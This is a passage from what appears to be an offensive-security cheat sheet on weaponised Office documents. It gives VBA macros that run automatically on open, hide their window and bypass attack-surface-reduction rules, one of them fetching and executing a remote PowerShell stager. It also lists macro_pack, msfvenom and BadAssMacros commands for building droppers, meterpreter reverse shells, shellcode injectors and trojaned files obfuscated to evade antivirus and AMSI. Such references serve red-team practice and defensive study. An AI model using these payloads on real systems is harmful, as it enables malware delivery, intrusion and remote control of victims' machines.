<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>    <span class="nb">Set </span><span class="n">objWMIService</span> <span class="p">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s2">&quot;winmgmts:\\&quot;</span> <span class="p">&amp;</span> <span class="n">strComputer</span> <span class="p">&amp;</span> <span class="s2">&quot;\root\cimv2&quot;</span><span class="p">)</span>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>    <span class="nb">Set </span><span class="n">objStartUp</span> <span class="p">=</span> <span class="n">objWMIService</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="s2">&quot;Win32_ProcessStartup&quot;</span><span class="p">)</span>
<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>    <span class="nb">Set </span><span class="n">objProc</span> <span class="p">=</span> <span class="n">objWMIService</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="s2">&quot;Win32_Process&quot;</span><span class="p">)</span>
<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>    <span class="nb">Set </span><span class="n">procStartConfig</span> <span class="p">=</span> <span class="n">objStartUp</span><span class="p">.</span><span class="n">SpawnInstance_</span>
<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>    <span class="n">procStartConfig</span><span class="p">.</span><span class="n">ShowWindow</span> <span class="p">=</span> <span class="n">1</span>
<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>    <span class="n">objProc</span><span class="p">.</span><span class="n">Create</span> <span class="s2">&quot;powershell.exe&quot;</span><span class="p">,</span> <span class="n">Null</span><span class="p">,</span> <span class="n">procStartConfig</span><span class="p">,</span> <span class="n">intProcessID</span>
<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a><span class="k">End</span> <span class="n">Sub</span>
</code></pre></div>
<ul>
<li>https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3</li>
<li>https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">Sub</span> <span class="n">ASR_bypass_create_child_process_rule5</span><span class="p">()</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>    <span class="n">Const</span> <span class="n">HIDDEN_WINDOW</span> <span class="p">=</span> <span class="n">0</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>    <span class="n">strComputer</span> <span class="p">=</span> <span class="s2">&quot;.&quot;</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>    <span class="nb">Set </span><span class="n">objWMIService</span> <span class="p">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s2">&quot;win&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;mgmts&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;:\\&quot;</span> <span class="p">&amp;</span> <span class="n">strComputer</span> <span class="p">&amp;</span> <span class="s2">&quot;\root&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;\cimv2&quot;</span><span class="p">)</span>
<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>    <span class="nb">Set </span><span class="n">objStartup</span> <span class="p">=</span> <span class="n">objWMIService</span><span class="p">.</span><span class="n">Get</span><span class="p">(</span><span class="s2">&quot;Win32_&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;Process&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;Startup&quot;</span><span class="p">)</span>
<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>    <span class="nb">Set </span><span class="n">objConfig</span> <span class="p">=</span> <span class="n">objStartup</span><span class="p">.</span><span class="n">SpawnInstance_</span>
<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>    <span class="n">objConfig</span><span class="p">.</span><span class="n">ShowWindow</span> <span class="p">=</span> <span class="n">HIDDEN_WINDOW</span>
<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>    <span class="nb">Set </span><span class="n">objProcess</span> <span class="p">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s2">&quot;winmgmts:\\&quot;</span> <span class="p">&amp;</span> <span class="n">strComputer</span> <span class="p">&amp;</span> <span class="s2">&quot;\root&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;\cimv2&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;:Win32_&quot;</span> <span class="p">&amp;</span> <span class="s2">&quot;Process&quot;</span><span class="p">)</span>
<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>    <span class="n">objProcess</span><span class="p">.</span><span class="n">Create</span> <span class="s2">&quot;cmd.exe /c powershell.exe IEX ( IWR -uri &#39;http://10.10.10.10/stage.ps1&#39;)&quot;</span><span class="p">,</span> <span class="n">Null</span><span class="p">,</span> <span class="n">objConfig</span><span class="p">,</span> <span class="n">intProcessID</span>
<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="k">End</span> <span class="n">Sub</span>
<a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a>
<a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="n">Sub</span> <span class="n">AutoExec</span><span class="p">()</span>
<a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a>    <span class="n">ASR_bypass_create_child_process_rule5</span>
<a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="k">End</span> <span class="n">Sub</span>
<a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a>
<a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="n">Sub</span> <span class="n">AutoOpen</span><span class="p">()</span>
<a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a>    <span class="n">ASR_bypass_create_child_process_rule5</span>
<a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="k">End</span> <span class="n">Sub</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">Const</span> <span class="n">ShellWindows</span> <span class="p">=</span> <span class="s2">&quot;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&quot;</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="nb">Set </span><span class="n">SW</span> <span class="p">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s2">&quot;new:&quot;</span> <span class="p">&amp;</span> <span class="n">ShellWindows</span><span class="p">).</span><span class="n">Item</span><span class="p">()</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="n">SW</span><span class="p">.</span><span class="n">Document</span><span class="p">.</span><span class="n">Application</span><span class="p">.</span><span class="n">ShellExecute</span> <span class="s2">&quot;cmd.exe&quot;</span><span class="p">,</span> <span class="s2">&quot;/c powershell.exe&quot;</span><span class="p">,</span> <span class="s2">&quot;C:\Windows\System32&quot;</span><span class="p">,</span> <span class="n">Null</span><span class="p">,</span> <span class="n">0</span>
</code></pre></div>
<h3 id="docmxlm-macro-pack-macro-and-dde">DOCM/XLM - Macro Pack - Macro and DDE</h3>
<blockquote>
<p>Only the community version is available online.</p>
</blockquote>
<ul>
<li><a href="https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe">https://github.com/sevagas/macro_pack</a></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c"># Options</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">-G</span><span class="p">,</span> <span class="p">-</span><span class="n">-generate</span><span class="p">=</span><span class="n">OUTPUT_FILE_PATH</span><span class="p">.</span> <span class="n">Generates</span> <span class="n">a</span> <span class="n">file</span><span class="p">.</span> 
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">-t</span><span class="p">,</span> <span class="p">-</span><span class="n">-template</span><span class="p">=</span><span class="n">TEMPLATE_NAME</span>    <span class="n">Use</span> <span class="n">code</span> <span class="n">template</span> <span class="n">already</span> <span class="n">included</span> <span class="k">in</span> <span class="n">MacroPack</span>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">-o</span><span class="p">,</span> <span class="p">-</span><span class="n">-obfuscate</span> <span class="n">Obfuscate</span> <span class="n">code</span> <span class="p">(</span><span class="n">remove</span> <span class="n">spaces</span><span class="p">,</span> <span class="n">obfuscate</span> <span class="n">strings</span><span class="p">,</span> <span class="n">obfuscate</span> <span class="n">functions</span> <span class="n">and</span> <span class="n">variables</span> <span class="n">name</span><span class="p">)</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="c"># Execute a command</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="nb">echo </span><span class="s2">&quot;calc.exe&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">CMD</span> <span class="n">-G</span> <span class="n">cmd</span><span class="p">.</span><span class="n">xsl</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="c"># Download and execute a file</span>
<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="nb">echo </span><span class="p">&lt;</span><span class="n">file_to_drop_url</span><span class="p">&gt;</span> <span class="s2">&quot;&lt;download_path&gt;&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">DROPPER</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">dropper</span><span class="p">.</span><span class="n">xls</span>
<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>
<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="c"># Meterpreter reverse TCP template using MacroMeter by Cn33liz</span>
<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="nb">echo </span><span class="p">&lt;</span><span class="n">ip</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">port</span><span class="p">&gt;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">METERPRETER</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">meter</span><span class="p">.</span><span class="n">docm</span>
<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>
<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="c"># Drop and execute embedded file</span>
<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a><span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">EMBED_EXE</span> <span class="p">-</span><span class="n">-embed</span><span class="p">=</span><span class="n">c</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">my_calc</span><span class="p">.</span><span class="n">vbs</span>
<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>
<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a><span class="c"># Obfuscate the vba file generated by msfvenom and put result in a new vba file.</span>
<a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">5</span> <span class="o">-f</span> <span class="n">vba</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">meterobf</span><span class="p">.</span><span class="n">vba</span>
<a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>
<a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a><span class="c"># Obfuscate Empire stager vba file and generate a MS Word document:</span>
<a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a><span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="o">-f</span> <span class="n">empire</span><span class="p">.</span><span class="n">vba</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">myDoc</span><span class="p">.</span><span class="n">docm</span>
<a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a>
<a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a><span class="c"># Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe)</span>
<a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a><span class="nb">echo </span><span class="s2">&quot;https://myurl.url/payload.exe&quot;</span> <span class="s2">&quot;dropped.exe&quot;</span> <span class="p">|</span>  <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="n">-t</span> <span class="n">DROPPER</span> <span class="n">-G</span> <span class="s2">&quot;drop.xlsm&quot;</span> 
<a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a>
<a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a><span class="c"># Execute calc.exe via Dynamic Data Exchange (DDE) attack</span>
<a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a><span class="nb">echo </span><span class="n">calc</span><span class="p">.</span><span class="n">exe</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-dde</span> <span class="n">-G</span> <span class="n">calc</span><span class="p">.</span><span class="n">xslx</span>
<a id="__codelineno-20-29" name="__codelineno-20-29" href="#__codelineno-20-29"></a>
<a id="__codelineno-20-30" name="__codelineno-20-30" href="#__codelineno-20-30"></a><span class="c"># Download and execute file via powershell using Dynamic Data Exchange (DDE) attack</span>
<a id="__codelineno-20-31" name="__codelineno-20-31" href="#__codelineno-20-31"></a><span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-dde</span> <span class="o">-f</span> <span class="p">..\</span><span class="n">resources</span><span class="p">\</span><span class="n">community</span><span class="p">\</span><span class="n">ps_dl_exec</span><span class="p">.</span><span class="n">cmd</span> <span class="n">-G</span> <span class="n">DDE</span><span class="p">.</span><span class="n">xsl</span>
<a id="__codelineno-20-32" name="__codelineno-20-32" href="#__codelineno-20-32"></a>
<a id="__codelineno-20-33" name="__codelineno-20-33" href="#__codelineno-20-33"></a><span class="c"># PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV).</span>
<a id="__codelineno-20-34" name="__codelineno-20-34" href="#__codelineno-20-34"></a><span class="n">msfvenom</span><span class="p">.</span><span class="n">bat</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">5</span> <span class="o">-f</span> <span class="n">vba</span> <span class="p">|</span>  <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="p">-</span><span class="n">-autopack</span> <span class="p">-</span><span class="n">-keep-alive</span>  <span class="n">-G</span>  <span class="n">out</span><span class="p">.</span><span class="n">docm</span>
<a id="__codelineno-20-35" name="__codelineno-20-35" href="#__codelineno-20-35"></a>
<a id="__codelineno-20-36" name="__codelineno-20-36" href="#__codelineno-20-36"></a><span class="c"># PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses.</span>
<a id="__codelineno-20-37" name="__codelineno-20-37" href="#__codelineno-20-37"></a><span class="n">msfvenom</span><span class="p">.</span><span class="n">bat</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">5</span> <span class="o">-f</span> <span class="n">vba</span> <span class="p">|</span>  <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-o</span> <span class="p">-</span><span class="n">-autopack</span> <span class="p">-</span><span class="n">-trojan</span> <span class="n">-G</span>  <span class="n">hotpics</span><span class="p">.</span><span class="n">pptm</span>
<a id="__codelineno-20-38" name="__codelineno-20-38" href="#__codelineno-20-38"></a>
<a id="__codelineno-20-39" name="__codelineno-20-39" href="#__codelineno-20-39"></a><span class="c"># PRO: Generate an HTA payload able to run a shellcode via Excel injection</span>
<a id="__codelineno-20-40" name="__codelineno-20-40" href="#__codelineno-20-40"></a><span class="nb">echo </span><span class="n">meterx86</span><span class="p">.</span><span class="n">bin</span> <span class="n">meterx64</span><span class="p">.</span><span class="n">bin</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">AUTOSHELLCODE</span>  <span class="p">-</span><span class="n">-run-in-excel</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">samples</span><span class="p">\</span><span class="n">nicepic</span><span class="p">.</span><span class="n">hta</span>
<a id="__codelineno-20-41" name="__codelineno-20-41" href="#__codelineno-20-41"></a><span class="nb">echo </span><span class="n">meterx86</span><span class="p">.</span><span class="n">bin</span> <span class="n">meterx64</span><span class="p">.</span><span class="n">bin</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">AUTOSHELLCODE</span> <span class="n">-o</span> <span class="p">-</span><span class="n">-hta-macro</span> <span class="p">-</span><span class="n">-run-in-excel</span> <span class="n">-G</span> <span class="n">samples</span><span class="p">\</span><span class="n">my_shortcut</span><span class="p">.</span><span class="n">lnk</span>
<a id="__codelineno-20-42" name="__codelineno-20-42" href="#__codelineno-20-42"></a>
<a id="__codelineno-20-43" name="__codelineno-20-43" href="#__codelineno-20-43"></a><span class="c"># PRO: XLM Injection</span>
<a id="__codelineno-20-44" name="__codelineno-20-44" href="#__codelineno-20-44"></a><span class="nb">echo </span><span class="s2">&quot;MPPro&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-G</span> <span class="n">_samples</span><span class="p">\</span><span class="n">hello</span><span class="p">.</span><span class="n">doc</span> <span class="n">-t</span> <span class="n">HELLO</span> <span class="p">-</span><span class="n">-xlm</span> <span class="p">-</span><span class="n">-run-in-excel</span>
<a id="__codelineno-20-45" name="__codelineno-20-45" href="#__codelineno-20-45"></a>
<a id="__codelineno-20-46" name="__codelineno-20-46" href="#__codelineno-20-46"></a><span class="c"># PRO: ShellCode Exec - Heap Injection, AlternativeInjection</span>
<a id="__codelineno-20-47" name="__codelineno-20-47" href="#__codelineno-20-47"></a><span class="nb">echo </span><span class="s2">&quot;x32calc.bin&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">SHELLCODE</span> <span class="n">-o</span> <span class="p">-</span><span class="n">-shellcodemethod</span><span class="p">=</span><span class="n">HeapInjection</span> <span class="n">-G</span> <span class="n">test</span><span class="p">.</span><span class="n">doc</span>
<a id="__codelineno-20-48" name="__codelineno-20-48" href="#__codelineno-20-48"></a><span class="nb">echo </span><span class="s2">&quot;x32calc.bin&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">SHELLCODE</span> <span class="n">-o</span> <span class="p">-</span><span class="n">-shellcodemethod</span><span class="p">=</span><span class="n">AlternativeInjection</span> <span class="p">-</span><span class="n">-background</span> <span class="n">-G</span> <span class="n">test</span><span class="p">.</span><span class="n">doc</span>
<a id="__codelineno-20-49" name="__codelineno-20-49" href="#__codelineno-20-49"></a>
<a id="__codelineno-20-50" name="__codelineno-20-50" href="#__codelineno-20-50"></a><span class="c"># PRO: More shellcodes</span>
<a id="__codelineno-20-51" name="__codelineno-20-51" href="#__codelineno-20-51"></a><span class="nb">echo </span><span class="n">x86</span><span class="p">.</span><span class="n">bin</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">SHELLCODE</span> <span class="n">-o</span> <span class="n">-G</span> <span class="n">test</span><span class="p">.</span><span class="n">pptm</span> <span class="err">–</span><span class="n">keep-alive</span>
<a id="__codelineno-20-52" name="__codelineno-20-52" href="#__codelineno-20-52"></a><span class="nb">echo </span><span class="s2">&quot;x86.bin&quot;</span> <span class="s2">&quot;x64.bin&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">AUTOSHELLCODE</span> <span class="n">-o</span> <span class="err">–</span><span class="n">autopack</span> <span class="n">-G</span> <span class="n">sc_auto</span><span class="p">.</span><span class="n">doc</span>
<a id="__codelineno-20-53" name="__codelineno-20-53" href="#__codelineno-20-53"></a><span class="nb">echo </span><span class="s2">&quot;http://192.168.5.10:8080/x32calc.bin&quot;</span> <span class="s2">&quot;http://192.168.5.10:8080/x64calc.bin&quot;</span> <span class="p">|</span> <span class="n">macro_pack</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">DROPPER_SHELLCODE</span> <span class="n">-o</span> <span class="p">-</span><span class="n">-shellcodemethod</span><span class="p">=</span><span class="n">ClassicIndirect</span> <span class="n">-G</span> <span class="n">samples</span><span class="p">\</span><span class="n">sc_dl</span><span class="p">.</span><span class="n">xls</span>
</code></pre></div>
<h3 id="docm-badassmacros">DOCM - BadAssMacros</h3>
<blockquote>
<p>C# based automated Malicous Macro Generator.</p>
</blockquote>
<ul>
<li>https://github.com/Inf0secRabbit/BadAssMacros</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">BadAssMacros</span><span class="p">.</span><span class="n">exe</span> <span class="n">-h</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c"># Create VBA for classic shellcode injection from raw shellcode</span>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="n">BadAssMacros</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="p">&lt;</span><span class="n">path_to_raw_shellcode_file</span><span class="p">&gt;</span> <span class="n">-w</span> <span class="p">&lt;</span><span class="n">doc</span><span class="p">/</span><span class="n">excel</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="n">no</span> <span class="n">-s</span> <span class="n">classic</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">caesar_shift_value</span><span class="p">&gt;</span> <span class="n">-o</span> <span class="p">&lt;</span><span class="n">path_to_output_file</span><span class="p">&gt;</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">BadAssMacros</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="p">.\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">payload</span><span class="p">.</span><span class="n">bin</span> <span class="n">-w</span> <span class="n">doc</span> <span class="n">-p</span> <span class="n">no</span> <span class="n">-s</span> <span class="n">classic</span> <span class="n">-c</span> <span class="n">23</span> <span class="n">-o</span> <span class="p">.\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">output</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c"># Create VBA for indirect shellcode injection from raw shellcode</span>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">BadAssMacros</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="p">&lt;</span><span class="n">path_to_raw_shellcode_file</span><span class="p">&gt;</span> <span class="n">-w</span> <span class="p">&lt;</span><span class="n">doc</span><span class="p">/</span><span class="n">excel</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="n">no</span> <span class="n">-s</span> <span class="n">indirect</span> <span class="n">-o</span> <span class="p">&lt;</span><span class="n">path_to_output_file</span><span class="p">&gt;</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="c"># List modules inside Doc/Excel file</span>
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="n">BadAssMacros</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="p">&lt;</span><span class="n">path_to_doc</span><span class="p">/</span><span class="n">excel_file</span><span class="p">&gt;</span> <span class="n">-w</span> <span class="p">&lt;</span><span class="n">doc</span><span class="p">/</span><span class="n">excel</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="n">yes</span> <span class="n">-l</span>
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>
<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a><span class="c"># Purge Doc/Excel file</span>
<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a><span class="n">BadAssMacros</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="p">&lt;</span><span class="n">path_to_doc</span><span class="p">/</span><span class="n">excel_file</span><span class="p">&gt;</span> <span class="n">-w</span> <span class="p">&lt;</span><span class="n">doc</span><span class="p">/</span><span class="n">excel</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="n">yes</span> <span class="n">-o</span> <span class="p">&lt;</span><span class="n">path_to_output_file</span><span class="p">&gt;</span> <span class="n">-m</span> <span class="p">&lt;</span><span class="n">module_name</span><span class="p">&gt;</span>
</code></pre></div>
<h3 id="docm-cactustorch-vba-module">DOCM - CACTUSTORCH VBA Module</h3>
<blockquote>
<p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p>
</blockquote>
<ul>
<li>https://github.com/mdsecactivebreach/CACTUSTORCH</li>
<li>https://github.com/tyranid/DotNetToJScript/</li>
<li>CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY</li>
<li>
<p>CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ</p>
</li>
<li>
<p>Import <strong>.cna</strong> in Cobalt Strike</p>
</li>
<li>Generate a new VBA payload from the CACTUSTORCH menu</li>
<li>Download DotNetToJscript</li>
<li>Compile it <ul>
<li><strong>DotNetToJscript.exe</strong> - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li>
<li><strong>ExampleAssembly.dll</strong> - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text "test"</li>
</ul>
</li>
<li>Execute <strong>DotNetToJscript.exe</strong> and supply it with the ExampleAssembly.dll, specify the output file and the output type
    <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">DotNetToJScript</span><span class="p">.</span><span class="n">exeExampleAssembly</span><span class="p">.</span><span class="n">dll</span> <span class="n">-l</span> <span class="n">vba</span> <span class="n">-o</span> <span class="n">test</span><span class="p">.</span><span class="n">vba</span> <span class="n">-c</span> <span class="n">cactusTorch</span>
</code></pre></div></li>
<li>Use the generated code to replace the hardcoded binary in CactusTorch</li>
</ul>
<h3 id="docm-mmg-with-custom-dl-exec">DOCM - MMG with Custom DL + Exec</h3>
<ol>
<li>Custom Download in first Macro to "C:\Users\Public\beacon.exe"</li>
<li>Create a custom binary execute using MMG</li>
<li>Merge both Macro</li>
</ol>
<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">Mr-Un1k0d3r</span><span class="p">/</span><span class="n">MaliciousMacroGenerator</span>
